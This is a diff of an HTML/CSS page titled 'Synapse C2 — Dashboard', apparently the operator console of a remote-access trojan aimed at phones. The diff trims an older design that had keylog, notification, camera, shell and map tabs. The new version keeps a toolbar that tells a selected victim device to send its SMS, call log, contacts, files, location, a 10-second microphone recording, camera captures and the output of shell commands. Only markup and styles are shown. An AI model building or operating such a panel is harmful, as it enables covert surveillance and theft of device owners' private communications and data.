@@ -3,912 +3,547 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>⚡ Synapse C2 — Command & Control</title>
-<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<title>Synapse C2 — Dashboard</title>
 <style>
-/* =============================================================
-   SYNAPSE C2 — PROFESSIONAL DARK CYBERPUNK THEME v2.0
-   ============================================================= */
+/* ============================================================
+   SYNAPSE C2 — SIMPLE BULLETPROOF DARK DASHBOARD
+   ============================================================ */
 *{margin:0;padding:0;box-sizing:border-box}
 :root{
-  --bg:#060b10; --bg2:#0d141d; --bg3:#151d28; --bg4:#1c2734;
-  --border:#223040; --text:#c8d6e5; --dim:#5a6e82; --accent:#4da6ff;
-  --green:#3cc95b; --red:#f85149; --orange:#f0883e; --purple:#c061cb;
-  --cyan:#39c5cf; --yellow:#e2b93b; --code-green:#7ee787;
-  --pink:#ff6b9d; --teal:#1dd1a1;
-  --font:'Inter','Segoe UI',system-ui,-apple-system,sans-serif;
+  --bg:#080c12; --bg2:#0e1520; --bg3:#151d2a; --bg4:#1c2736;
+  --border:#1e2d3d; --text:#c0ccd8; --dim:#546478;
+  --accent:#4da6ff; --green:#3cc95b; --red:#f85149;
+  --orange:#f0883e; --yellow:#e2b93b; --cyan:#39c5cf;
+  --purple:#c061cb; --teal:#1dd1a1; --code:#7ee787;
+  --font:'Inter','Segoe UI',system-ui,sans-serif;
   --mono:'JetBrains Mono','Fira Code','Cascadia Code',monospace;
 }
 html,body{height:100%;overflow:hidden}
 body{font-family:var(--font);background:var(--bg);color:var(--text);font-size:13px;line-height:1.5}
 
 /* HEADER */
-.header{background:var(--bg2);border-bottom:1px solid var(--border);padding:0 16px;height:46px;display:flex;align-items:center;gap:12px;flex-shrink:0}
-.header .logo{font-size:17px;font-weight:800;color:var(--accent);letter-spacing:-0.5px;white-space:nowrap}
-.header .logo .bolt{color:var(--yellow)}
-.header .server-status{margin-left:auto;font-size:11px;color:var(--dim);display:flex;align-items:center;gap:6px}
-.header .dot{width:8px;height:8px;border-radius:50%}
-.header .dot.green{background:var(--green);box-shadow:0 0 8px var(--green)}
+.header{background:var(--bg2);border-bottom:1px solid var(--border);padding:0 16px;height:44px;display:flex;align-items:center;gap:10px;flex-shrink:0}
+.header .logo{font-size:15px;font-weight:800;color:var(--accent);letter-spacing:-0.3px}
+.header .status{margin-left:auto;font-size:10px;color:var(--dim);display:flex;align-items:center;gap:6px}
+.header .dot{width:7px;height:7px;border-radius:50%}
+.header .dot.green{background:var(--green);box-shadow:0 0 6px var(--green)}
 .header .dot.red{background:var(--red)}
 .header .dot.yellow{background:var(--yellow)}
 
 /* MAIN LAYOUT */
-.layout{display:grid;grid-template-columns:300px 1fr;height:calc(100vh - 46px);overflow:hidden}
-@media(max-width:900px){.layout{grid-template-columns:1fr}.sidebar{display:none}.sidebar.mobile-show{display:flex;position:fixed;inset:46px 0 0 0;z-index:100}}
+.layout{display:flex;height:calc(100vh - 44px);overflow:hidden}
 
 /* SIDEBAR */
-.sidebar{background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden}
-.sidebar-section{padding:10px 12px;border-bottom:1px solid var(--border)}
-.sidebar-section:last-child{border-bottom:none}
-.sidebar-title{font-size:10px;color:var(--dim);text-transform:uppercase;letter-spacing:1.2px;margin-bottom:8px;display:flex;align-items:center;gap:6px}
-.sidebar-title .count{color:var(--accent);font-size:11px}
-.device-search-wrap{margin-bottom:8px}
-.device-search-wrap input{width:100%;background:var(--bg);border:1px solid var(--border);border-radius:4px;color:var(--text);padding:5px 8px;font-size:11px;outline:none}
-.device-search-wrap input:focus{border-color:var(--accent)}
-.device-list-scroll{overflow-y:auto;flex:1;padding:0 8px 8px}
-.device-card{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:8px 10px;cursor:pointer;transition:all .15s;margin-bottom:5px}
+.sidebar{width:280px;min-width:280px;background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden}
+.sidebar-header{padding:10px 12px;border-bottom:1px solid var(--border);font-size:10px;color:var(--dim);text-transform:uppercase;letter-spacing:1px;display:flex;align-items:center;gap:6px}
+.sidebar-header .count{color:var(--accent);font-size:11px}
+.device-list{flex:1;overflow-y:auto;padding:4px}
+.device-card{background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:7px 9px;margin:3px 0;cursor:pointer;transition:all 0.12s}
 .device-card:hover{border-color:var(--accent)}
-.device-card.selected{border-color:var(--accent);background:#101d2e;box-shadow:0 0 12px rgba(77,166,255,0.1)}
-.device-card .dev-top{display:flex;align-items:center;gap:7px;margin-bottom:3px}
-.device-card .dev-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
-.device-card .dev-dot.online{background:var(--green);box-shadow:0 0 6px var(--green)}
-.device-card .dev-dot.offline{background:var(--red)}
-.device-card .dev-id{font-size:11px;font-weight:600;color:var(--accent);word-break:break-all;font-family:var(--mono);line-height:1.2}
-.device-card .dev-meta{font-size:10px;color:var(--dim);display:flex;flex-wrap:wrap;gap:4px}
+.device-card.selected{border-color:var(--accent);background:#101d2e;box-shadow:0 0 10px rgba(77,166,255,0.08)}
+.device-card .dev-row{display:flex;align-items:center;gap:6px;margin-bottom:2px}
+.device-card .status-dot{width:6px;height:6px;border-radius:50%;flex-shrink:0}
+.device-card .status-dot.online{background:var(--green);box-shadow:0 0 5px var(--green)}
+.device-card .status-dot.offline{background:var(--red)}
+.device-card .dev-id{font-size:10px;font-weight:600;color:var(--accent);font-family:var(--mono);word-break:break-all;line-height:1.2}
+.device-card .dev-meta{font-size:9px;color:var(--dim)}
 .device-card .dev-meta span{color:var(--text)}
-.info-card{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:8px 10px;margin-top:5px}
-.info-card .info-row{display:flex;padding:2px 0;font-size:10px}
-.info-card .info-label{color:var(--dim);width:80px;flex-shrink:0;font-weight:500}
-.info-card .info-value{color:var(--text);word-break:break-all;font-family:var(--mono);font-size:10px}
+.info-panel{padding:8px 10px;border-top:1px solid var(--border);display:none}
+.info-panel.visible{display:block}
+.info-panel .info-row{display:flex;padding:1px 0;font-size:9px}
+.info-panel .info-label{color:var(--dim);width:60px;flex-shrink:0}
+.info-panel .info-value{color:var(--text);word-break:break-all;font-family:var(--mono);font-size:9px}
+.stats-row{border-top:1px solid var(--border);padding:6px 10px;display:flex;gap:10px;font-size:9px}
+.stats-row .stat{color:var(--dim)}
+.stats-row .stat b{color:var(--accent)}
 
 /* MAIN */
-.main{display:flex;flex-direction:column;overflow:hidden}
-.tabs{display:flex;gap:0;border-bottom:1px solid var(--border);background:var(--bg2);flex-shrink:0;overflow-x:auto}
-.tabs button{padding:9px 14px;background:transparent;border:none;color:var(--dim);cursor:pointer;font-size:11px;font-weight:500;border-bottom:2px solid transparent;transition:all .15s;white-space:nowrap;font-family:var(--font)}
-.tabs button:hover{color:var(--text)}
-.tabs button.active{color:var(--accent);border-bottom-color:var(--accent)}
-.tabs button .badge{background:var(--accent);color:#000;font-size:10px;padding:1px 5px;border-radius:8px;margin-left:4px;font-weight:700}
-.tab-panel{flex:1;overflow:hidden;display:none}
-.tab-panel.active{display:flex;flex-direction:column}
+.main{flex:1;display:flex;flex-direction:column;overflow:hidden}
 
-/* STATS BAR */
-.stats-bar{display:flex;gap:10px;padding:6px 12px;background:var(--bg2);border-bottom:1px solid var(--border);flex-shrink:0;overflow-x:auto}
-.stat-pill{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:4px 10px;display:flex;align-items:center;gap:5px;font-size:10px;white-space:nowrap}
-.stat-pill .num{font-weight:700;color:var(--accent);font-size:14px}
-.stat-pill .lbl{color:var(--dim);font-size:10px;text-transform:uppercase}
+/* TOOLBAR */
+.toolbar{background:var(--bg2);border-bottom:1px solid var(--border);padding:6px 10px;display:flex;gap:4px;flex-wrap:wrap;flex-shrink:0}
+.toolbar button{padding:4px 10px;border-radius:3px;border:1px solid var(--border);background:var(--bg3);color:var(--text);font-size:10px;cursor:pointer;transition:all 0.12s;font-family:var(--font);font-weight:500;white-space:nowrap}
+.toolbar button:hover{border-color:var(--accent);color:var(--accent)}
+.toolbar button:disabled{opacity:0.35;cursor:not-allowed;pointer-events:none}
+.toolbar .sep{width:1px;background:var(--border);margin:0 4px;align-self:stretch}
 
-/* ========== BUTTONS ========== */
-.btn{padding:5px 11px;border-radius:4px;border:1px solid var(--border);background:var(--bg3);color:var(--text);font-size:10px;cursor:pointer;transition:all .15s;font-weight:500;white-space:nowrap;font-family:var(--font)}
-.btn:hover{border-color:var(--accent);color:var(--accent)}
-.btn:disabled{opacity:.4;cursor:not-allowed}
-.btn-primary{background:var(--accent);border-color:var(--accent);color:#000;font-weight:700}
-.btn-primary:hover{background:#5ab4ff;color:#000}
-.btn-success{background:var(--green);border-color:var(--green);color:#000;font-weight:700}
-.btn-danger{background:var(--red);border-color:var(--red);color:#fff;font-weight:700}
-.btn-sm{padding:3px 8px;font-size:9px}
+/* RESULT PANEL */
+.result-panel{flex:1;display:flex;flex-direction:column;overflow:hidden}
+.result-header{background:var(--bg2);border-bottom:1px solid var(--border);padding:4px 12px;font-size:10px;color:var(--dim);display:flex;align-items:center;gap:8px;flex-shrink:0}
+.result-header .result-label{color:var(--accent);font-weight:600}
+.result-area{flex:1;overflow:auto;padding:12px;background:var(--bg);font-family:var(--mono);font-size:11px;color:var(--code);white-space:pre-wrap;word-break:break-word;line-height:1.6}
+.result-area .empty{color:var(--dim);font-family:var(--font);font-size:12px;text-align:center;padding:60px 20px}
+.result-area .error-block{color:var(--red)}
+.result-area .key{color:var(--accent)}
+.result-area .val-str{color:var(--orange)}
+.result-area .val-num{color:var(--cyan)}
+.result-area .val-bool{color:var(--purple)}
+.result-area .null{color:var(--dim)}
 
-/* ========== DATA VIEWERS (shared) ========== */
-.data-panel{display:flex;flex-direction:column;overflow:hidden;flex:1}
-.data-toolbar{padding:8px 12px;background:var(--bg2);border-bottom:1px solid var(--border);display:flex;gap:8px;align-items:center;flex-wrap:wrap;flex-shrink:0}
-.data-toolbar input{background:var(--bg);border:1px solid var(--border);border-radius:3px;color:var(--text);padding:5px 8px;font-family:var(--mono);font-size:11px;outline:none;width:160px}
-.data-toolbar input:focus{border-color:var(--accent)}
-.data-toolbar select{background:var(--bg);border:1px solid var(--border);border-radius:3px;color:var(--text);padding:5px 8px;font-size:11px;outline:none}
-.data-toolbar select:focus{border-color:var(--accent)}
-.data-table-wrap{flex:1;overflow:auto;background:var(--bg)}
-.data-table{width:100%;border-collapse:collapse;font-size:11px}
-.data-table thead{position:sticky;top:0;z-index:2}
-.data-table th{background:var(--bg3);color:var(--accent);padding:8px 10px;text-align:left;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;border-bottom:2px solid var(--border);white-space:nowrap}
-.data-table td{padding:6px 10px;border-bottom:1px solid rgba(34,48,64,0.5);color:var(--text);font-family:var(--mono);font-size:10px;white-space:nowrap;max-width:300px;overflow:hidden;text-overflow:ellipsis}
-.data-table tbody tr:hover{background:var(--bg2)}
-.data-table .type-incoming{color:var(--green)}
-.data-table .type-outgoing{color:var(--accent)}
-.data-table .type-missed{color:var(--red)}
-.data-table .msg-body{cursor:pointer;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:400px}
-.data-table .msg-body:hover{color:var(--yellow)}
+/* SMS pretty print */
+.sms-item{padding:6px 0;border-bottom:1px solid rgba(30,45,61,0.5)}
+.sms-item .sms-sender{color:var(--accent);font-weight:600;font-size:11px}
+.sms-item .sms-body{color:var(--text);font-size:11px;margin-top:2px}
+.sms-item .sms-meta{color:var(--dim);font-size:9px;margin-top:1px}
 
-/* SMS conversation grouping */
-.convo-group{border-bottom:2px solid var(--border);margin-bottom:2px}
-.convo-header{padding:8px 12px;background:var(--bg3);cursor:pointer;display:flex;align-items:center;gap:10px;font-weight:600;font-size:12px;color:var(--accent);border-bottom:1px solid var(--border)}
-.convo-header:hover{background:var(--bg4)}
-.convo-header .c-addr{flex:1;font-family:var(--mono)}
-.convo-header .c-count{color:var(--dim);font-size:10px}
-.convo-body{display:none}
-.convo-body.open{display:block}
-.convo-body table{width:100%;font-size:10px}
-.convo-body td{padding:4px 10px;border-bottom:1px solid rgba(34,48,64,0.3)}
+/* File pretty print */
+.file-item{padding:4px 0;display:flex;justify-content:space-between;font-size:10px}
+.file-item .file-name{color:var(--accent)}
+.file-item .file-size{color:var(--dim)}
+.file-item .file-date{color:var(--dim)}
+.file-item.isfile{border-bottom:1px solid rgba(30,45,61,0.3)}
+.file-item.isdir{color:var(--yellow)}
 
-/* Audio player */
-.audio-row{display:flex;align-items:center;gap:8px;padding:4px 10px}
-.audio-row audio{height:28px;width:200px}
-.audio-row .audio-info{font-size:10px;color:var(--dim)}
-
-/* Keylog viewer */
-.keylog-list{flex:1;overflow-y:auto;padding:8px;background:var(--bg)}
-.keylog-entry{padding:6px 10px;margin-bottom:4px;background:var(--bg3);border:1px solid var(--border);border-radius:4px;display:flex;gap:10px;align-items:flex-start;font-size:11px}
-.keylog-entry .kl-pkg{color:var(--accent);font-size:9px;font-weight:600;min-width:100px}
-.keylog-entry .kl-text{color:var(--code-green);font-family:var(--mono);font-size:11px;word-break:break-all;flex:1}
-.keylog-entry .kl-time{color:var(--dim);font-size:9px;white-space:nowrap}
-
-/* Notifications list */
-.notif-entry{padding:7px 10px;border-bottom:1px solid var(--border);font-size:11px}
-.notif-entry .n-app{color:var(--accent);font-size:10px;font-weight:600}
-.notif-entry .n-title{color:var(--text);font-weight:600;margin:3px 0}
-.notif-entry .n-text{color:var(--dim);font-size:10px}
-.notif-entry .n-time{color:var(--dim);font-size:9px}
-
-/* LIVE FEED */
-.feed-panel{display:flex;flex-direction:column;overflow:hidden;flex:1}
-.feed-filter{padding:6px 10px;background:var(--bg2);border-bottom:1px solid var(--border);display:flex;gap:4px;flex-wrap:wrap;flex-shrink:0}
-.feed-filter .flt{font-size:9px;padding:2px 7px;border-radius:3px;cursor:pointer;border:1px solid var(--border);background:var(--bg3);color:var(--dim);transition:all .15s}
-.feed-filter .flt.active{color:var(--text);border-color:var(--accent)}
-.feed-filter .flt:hover{color:var(--text)}
-.live-feed-scroll{flex:1;overflow-y:auto;padding:8px;background:var(--bg)}
-.feed-entry{padding:7px 10px;border-left:3px solid var(--border);margin-bottom:5px;border-radius:0 4px 4px 0;transition:border-color .15s;font-size:11px}
-.feed-entry:hover{border-left-color:var(--accent)}
-.feed-entry.ping{border-left-color:var(--green)}
-.feed-entry.info{border-left-color:var(--accent)}
-.feed-entry.shell{border-left-color:var(--yellow)}
-.feed-entry.camera{border-left-color:var(--purple)}
-.feed-entry.files{border-left-color:var(--orange)}
-.feed-entry.location{border-left-color:var(--cyan)}
-.feed-entry.sms{border-left-color:var(--teal)}
-.feed-entry.calls{border-left-color:var(--pink)}
-.feed-entry.contacts{border-left-color:var(--purple)}
-.feed-entry.mic{border-left-color:var(--red)}
-.feed-entry.notifications{border-left-color:var(--yellow)}
-.feed-entry.keylog{border-left-color:var(--orange)}
-.feed-entry.error{border-left-color:var(--red)}
-.feed-meta{font-size:9px;color:var(--dim);display:flex;align-items:center;gap:6px;flex-wrap:wrap;margin-bottom:3px}
-.feed-tag{background:var(--bg3);padding:1px 6px;border-radius:3px;font-size:9px;text-transform:uppercase;letter-spacing:.5px;font-weight:600}
-.feed-tag.ping{color:var(--green)} .feed-tag.info{color:var(--accent)} .feed-tag.shell{color:var(--yellow)}
-.feed-tag.camera{color:var(--purple)} .feed-tag.files{color:var(--orange)} .feed-tag.location{color:var(--cyan)}
-.feed-tag.sms{color:var(--teal)} .feed-tag.calls{color:var(--pink)} .feed-tag.contacts{color:var(--purple)}
-.feed-tag.mic{color:var(--red)} .feed-tag.notifications{color:var(--yellow)} .feed-tag.keylog{color:var(--orange)}
-.feed-body{font-size:11px;color:var(--code-green);white-space:pre-wrap;word-break:break-word;line-height:1.4}
-
-/* COMMAND CONSOLE */
-.cmd-console{display:flex;flex-direction:column;overflow:hidden;flex:1}
-.cmd-quick-actions{padding:8px 12px;background:var(--bg2);border-bottom:1px solid var(--border);display:flex;gap:4px;flex-wrap:wrap;flex-shrink:0}
-.cmd-row{padding:8px 12px;background:var(--bg2);display:flex;gap:6px;align-items:center;flex-shrink:0;border-bottom:1px solid var(--border)}
-.cmd-row input,.cmd-row select{background:var(--bg);border:1px solid var(--border);border-radius:3px;color:var(--text);padding:6px 8px;font-family:var(--mono);font-size:11px;outline:none}
-.cmd-row input:focus,.cmd-row select:focus{border-color:var(--accent)}
-.cmd-row .mod-input{width:110px;flex-shrink:0}
-.cmd-row .act-input{width:100px;flex-shrink:0}
-.cmd-row .params-input{flex:1}
-.cmd-send-btn{background:var(--green);border:1px solid var(--green);border-radius:3px;color:#000;padding:6px 16px;font-size:11px;font-weight:700;cursor:pointer;transition:all .15s;white-space:nowrap}
-.cmd-send-btn:hover{background:#44d963}
-.cmd-send-btn:disabled{background:var(--bg3);border-color:var(--border);color:#484f58;cursor:not-allowed}
-.cmd-history-scroll{flex:1;overflow-y:auto;padding:6px;background:var(--bg)}
-.cmd-history-entry{padding:5px 8px;margin-bottom:3px;border-radius:3px;cursor:pointer;font-size:10px;font-family:var(--mono);display:flex;align-items:center;gap:6px}
-.cmd-history-entry:hover{background:var(--bg3)}
-.cmd-history-entry .h-mod{color:var(--accent);font-weight:600}
-.cmd-history-entry .h-act{color:var(--text)}
-.cmd-history-entry .h-params{color:var(--dim);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.cmd-history-entry .h-time{color:var(--dim);font-size:9px;flex-shrink:0}
-.cmd-empty{color:#484f58;text-align:center;padding:30px;font-size:12px}
-
-/* SHELL */
-.shell-panel{display:flex;flex-direction:column;overflow:hidden;flex:1}
-.shell-input-row{padding:6px 10px;background:var(--bg2);border-bottom:1px solid var(--border);display:flex;gap:6px;flex-shrink:0}
-.shell-input-row input{flex:1;background:#050a0f;border:1px solid var(--border);border-radius:3px;color:var(--code-green);padding:6px 10px;font-family:var(--mono);font-size:12px;outline:none}
-.shell-input-row input:focus{border-color:var(--accent)}
-.shell-input-row button{padding:6px 14px;background:var(--orange);border:1px solid var(--orange);border-radius:3px;color:#000;font-weight:700;font-size:11px;cursor:pointer;transition:all .15s}
-.shell-input-row button:hover{background:#f49b52}
-.shell-input-row button:disabled{opacity:.5;cursor:not-allowed}
-.shell-terminal{flex:1;overflow-y:auto;padding:10px;background:#04080c;font-family:var(--mono);font-size:11px;line-height:1.5;color:var(--code-green)}
-.shell-terminal .s-line{padding:1px 0}
-.shell-terminal .s-cmd{color:var(--accent)}
-.shell-terminal .s-stderr{color:var(--red)}
-.shell-terminal .s-exit{color:var(--dim);font-size:9px;margin-top:1px;border-top:1px solid var(--border);padding-top:1px}
-.shell-terminal .s-exit.nonzero{color:var(--red)}
-
-/* CAMERA */
-.camera-scroll{flex:1;overflow-y:auto;padding:10px;background:var(--bg);display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px;align-content:start}
-.camera-card{background:var(--bg3);border:1px solid var(--border);border-radius:6px;overflow:hidden;transition:all .15s}
-.camera-card:hover{border-color:var(--purple)}
-.camera-card img{width:100%;height:160px;object-fit:cover;cursor:pointer;display:block}
-.camera-card .cam-info{padding:6px 8px;font-size:9px;color:var(--dim);display:flex;justify-content:space-between}
-.camera-card .cam-info span{color:var(--text)}
-
-/* MAP */
-.map-panel{overflow:hidden;position:relative;flex:1}
-.map-container{width:100%;height:100%;background:var(--bg)}
-.map-pin-info{position:absolute;bottom:14px;left:14px;background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:8px 12px;font-size:11px;z-index:1000;max-width:280px}
-.map-pin-info .coords{color:var(--accent);font-family:var(--mono);font-weight:600}
-.map-pin-info .meta{font-size:9px;color:var(--dim);margin-top:2px}
-.map-empty{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:var(--dim);font-size:13px;z-index:500;pointer-events:none}
-
-/* FILE BROWSER */
-.file-browser{display:flex;flex-direction:column;overflow:hidden;flex:1}
-.file-toolbar{padding:6px 10px;background:var(--bg2);border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px;flex-shrink:0;flex-wrap:wrap}
-.file-toolbar .breadcrumb{display:flex;align-items:center;gap:4px;font-size:10px;color:var(--dim);flex:1}
-.file-toolbar .breadcrumb span{color:var(--accent);cursor:pointer}
-.file-toolbar .breadcrumb span:hover{text-decoration:underline}
-.file-toolbar .path-input{background:var(--bg);border:1px solid var(--border);border-radius:3px;color:var(--text);padding:4px 7px;font-family:var(--mono);font-size:10px;width:180px;outline:none}
-.file-toolbar .path-input:focus{border-color:var(--accent)}
-.file-grid{flex:1;overflow-y:auto;padding:10px;display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px;align-content:start;background:var(--bg)}
-.file-thumb{background:var(--bg3);border:1px solid var(--border);border-radius:5px;overflow:hidden;cursor:pointer;transition:all .15s;display:flex;flex-direction:column}
-.file-thumb:hover{border-color:var(--accent)}
-.file-thumb .thumb-img-container{width:100%;height:100px;background:var(--bg);display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative}
-.file-thumb .thumb-img-container img{width:100%;height:100%;object-fit:cover}
-.file-thumb .thumb-img-container .file-icon{font-size:30px;color:var(--dim)}
-.file-thumb .thumb-info{padding:6px 8px}
-.file-thumb .thumb-name{font-size:10px;font-weight:600;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.file-thumb .thumb-meta{font-size:9px;color:var(--dim);display:flex;justify-content:space-between;margin-top:1px}
-
-/* MODAL */
-.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.92);z-index:9999;justify-content:center;align-items:center;cursor:pointer}
-.modal-overlay.show{display:flex}
-.modal-overlay img{max-width:95vw;max-height:95vh;border-radius:8px;box-shadow:0 0 40px rgba(0,0,0,0.5)}
-.modal-overlay .modal-close{position:absolute;top:16px;right:24px;color:#fff;font-size:28px;cursor:pointer;width:36px;height:36px;display:flex;align-items:center;justify-content:center;border-radius:50%;background:rgba(255,255,255,0.08);transition:all .15s}
-.modal-overlay .modal-close:hover{background:rgba(255,255,255,0.18)}
-
-/* TOAST */
-.toast-container{position:fixed;bottom:16px;right:16px;z-index:8000;display:flex;flex-direction:column;gap:6px}
-.toast{background:var(--bg3);border:1px solid var(--accent);color:var(--text);padding:8px 16px;border-radius:5px;font-size:11px;animation:slideIn .3s ease;max-width:350px;word-break:break-word}
-.toast.error{border-color:var(--red)}.toast.success{border-color:var(--green)}
-@keyframes slideIn{from{transform:translateX(40px);opacity:0}to{transform:translateX(0);opacity:1}}
-
+/* ========== SCROLLBAR ========== */
 ::-webkit-scrollbar{width:5px;height:5px}
 ::-webkit-scrollbar-track{background:var(--bg)}
 ::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
 ::-webkit-scrollbar-thumb:hover{background:var(--dim)}
 
-.loading{color:var(--dim);text-align:center;padding:60px 20px;font-size:13px}
-.loading .icon{font-size:36px;margin-bottom:8px}
-
-/* Empty state for data viewers */
-.empty-state{color:var(--dim);text-align:center;padding:40px 20px;font-size:12px}
-.empty-state .icon{font-size:40px;margin-bottom:8px;display:block}
+/* TOAST */
+.toast-container{position:fixed;bottom:14px;right:14px;z-index:9999;display:flex;flex-direction:column;gap:5px}
+.toast{background:var(--bg3);border:1px solid var(--accent);color:var(--text);padding:7px 14px;border-radius:4px;font-size:10px;animation:slideIn 0.25s ease;max-width:320px;word-break:break-word}
+.toast.error{border-color:var(--red)}
+.toast.success{border-color:var(--green)}
+@keyframes slideIn{from{transform:translateX(30px);opacity:0}to{transform:translateX(0);opacity:1}}
 </style>
 </head>
 <body>
 
 <!-- HEADER -->
 <div class="header">
-  <div class="logo"><span class="bolt">⚡</span> Synapse C2</div>
-  <button class="btn btn-sm" onclick="toggleSidebar()" style="display:none" id="mobile-sidebar-btn">☰</button>
-  <div class="server-status"><span class="dot yellow" id="sse-dot"></span><span id="sse-status">Connecting...</span></div>
+  <div class="logo">Synapse C2</div>
+  <div class="status"><span class="dot yellow" id="sse-dot"></span><span id="sse-label">Connecting...</span></div>
 </div>
 
 <!-- LAYOUT -->
 <div class="layout">
   <!-- SIDEBAR -->
   <div class="sidebar" id="sidebar">
-    <div class="sidebar-section">
-      <div class="sidebar-title">📱 Devices <span class="count" id="device-count">(0)</span></div>
-      <div class="device-search-wrap"><input type="text" id="device-search" placeholder="Filter devices..." oninput="renderDeviceList()"></div>
+    <div class="sidebar-header">Devices <span class="count" id="dev-count">(0)</span></div>
+    <div class="device-list" id="device-list">
+      <div style="color:var(--dim);text-align:center;padding:24px;font-size:11px">No devices connected</div>
     </div>
-    <div class="device-list-scroll" id="device-list"><div style="color:var(--dim);text-align:center;padding:20px;font-size:11px">No devices connected</div></div>
-    <div class="sidebar-section" id="device-info-panel" style="display:none">
-      <div class="sidebar-title">ℹ️ Device Info</div>
-      <div class="info-card" id="device-info-card"></div>
+    <div class="info-panel" id="info-panel">
+      <div class="info-row"><span class="info-label">Status:</span><span class="info-value" id="inf-status">—</span></div>
+      <div class="info-row"><span class="info-label">Model:</span><span class="info-value" id="inf-model">—</span></div>
+      <div class="info-row"><span class="info-label">Brand:</span><span class="info-value" id="inf-brand">—</span></div>
+      <div class="info-row"><span class="info-label">SDK:</span><span class="info-value" id="inf-sdk">—</span></div>
+      <div class="info-row"><span class="info-label">OS:</span><span class="info-value" id="inf-os">—</span></div>
+      <div class="info-row"><span class="info-label">Seen:</span><span class="info-value" id="inf-seen">—</span></div>
+    </div>
+    <div class="stats-row">
+      <span class="stat">Online: <b id="st-online">0</b></span>
+      <span class="stat">Offline: <b id="st-offline">0</b></span>
+      <span class="stat">Results: <b id="st-results">0</b></span>
     </div>
   </div>
 
   <!-- MAIN -->
   <div class="main">
-    <!-- STATS -->
-    <div class="stats-bar">
-      <div class="stat-pill"><span class="num" id="st-total">0</span><span class="lbl">Total</span></div>
-      <div class="stat-pill"><span class="num" id="st-online">0</span><span class="lbl">Online</span></div>
-      <div class="stat-pill"><span class="num" id="st-offline">0</span><span class="lbl">Offline</span></div>
-      <div class="stat-pill"><span class="num" id="st-results">0</span><span class="lbl">Results</span></div>
+    <!-- TOOLBAR -->
+    <div class="toolbar" id="toolbar">
+      <button onclick="sendQuickCommand('ping','ping')" id="btn-ping">Ping</button>
+      <button onclick="sendQuickCommand('info','gather')" id="btn-info">Device Info</button>
+      <span class="sep"></span>
+      <button onclick="sendQuickCommand('sms','list')" id="btn-sms">SMS List</button>
+      <button onclick="sendQuickCommand('calls','list')" id="btn-calls">Call Log</button>
+      <button onclick="sendQuickCommand('contacts','list')" id="btn-contacts">Contacts</button>
+      <span class="sep"></span>
+      <button onclick="sendQuickCommand('files','list','{\"path\":\"/sdcard\",\"count\":\"100\"}')" id="btn-files">Files</button>
+      <span class="sep"></span>
+      <button onclick="sendQuickCommand('shell','exec','{\"cmd\":\"id\"}')" id="btn-shell">Shell (id)</button>
+      <button onclick="sendQuickCommand('location','get')" id="btn-location">Location</button>
+      <button onclick="sendQuickCommand('mic','record','{\"duration\":10}')" id="btn-mic">Mic 10s</button>
+      <button onclick="sendQuickCommand('camera','capture')" id="btn-camera">Camera</button>
     </div>
 
-    <!-- TABS -->
-    <div class="tabs" id="main-tabs">
-      <button class="active" data-tab="feed">📡 Live Feed<span class="badge" id="badge-feed" style="display:none">0</span></button>
-      <button data-tab="console">💻 Console</button>
-      <button data-tab="sms">💬 SMS</button>
-      <button data-tab="calls">📞 Calls</button>
-      <button data-tab="contacts">👥 Contacts</button>
-      <button data-tab="mic">🎙️ Mic</button>
-      <button data-tab="notifications">🔔 Notifs</button>
-      <button data-tab="keylog">⌨️ Keylog</button>
-      <button data-tab="camera">📸 Camera</button>
-      <button data-tab="shell">⬛ Shell</button>
-      <button data-tab="files">📁 Files</button>
-      <button data-tab="map">🗺️ Map</button>
-    </div>
-
-    <!-- ========== PANEL: LIVE FEED ========== -->
-    <div class="tab-panel active" id="panel-feed">
-      <div class="feed-panel">
-        <div class="feed-filter" id="feed-filter">
-          <button class="flt active" data-flt="all">All</button>
-          <button class="flt" data-flt="ping">🏓 Ping</button>
-          <button class="flt" data-flt="info">📋 Info</button>
-          <button class="flt" data-flt="shell">💻 Shell</button>
-          <button class="flt" data-flt="camera">📸 Camera</button>
-          <button class="flt" data-flt="files">📁 Files</button>
-          <button class="flt" data-flt="location">📍 Location</button>
-          <button class="flt" data-flt="sms">💬 SMS</button>
-          <button class="flt" data-flt="calls">📞 Calls</button>
-          <button class="flt" data-flt="contacts">👥 Contacts</button>
-          <button class="flt" data-flt="mic">🎙️ Mic</button>
-          <button class="flt" data-flt="notifications">🔔 Notifs</button>
-          <button class="flt" data-flt="keylog">⌨️ Keylog</button>
-          <button class="flt" data-flt="error">❌ Errors</button>
-          <button class="btn btn-sm btn-success" onclick="exportFeedJSON()">📥 Export JSON</button>
-          <button class="btn btn-sm btn-success" onclick="exportFeedCSV()">📊 Export CSV</button>
-        </div>
-        <div class="live-feed-scroll" id="live-feed"><div class="loading"><span class="icon">📡</span>Awaiting real-time results via SSE...</div></div>
+    <!-- RESULT PANEL -->
+    <div class="result-panel">
+      <div class="result-header">
+        <span class="result-label" id="result-label">Results</span>
+        <span style="font-size:9px" id="result-cmd">—</span>
+      </div>
+      <div class="result-area" id="result-area">
+        <div class="empty">Awaiting results via SSE — select a device and click a button above</div>
       </div>
     </div>
-
-    <!-- ========== PANEL: CONSOLE ========== -->
-    <div class="tab-panel" id="panel-console">
-      <div class="cmd-console">
-        <div class="cmd-quick-actions">
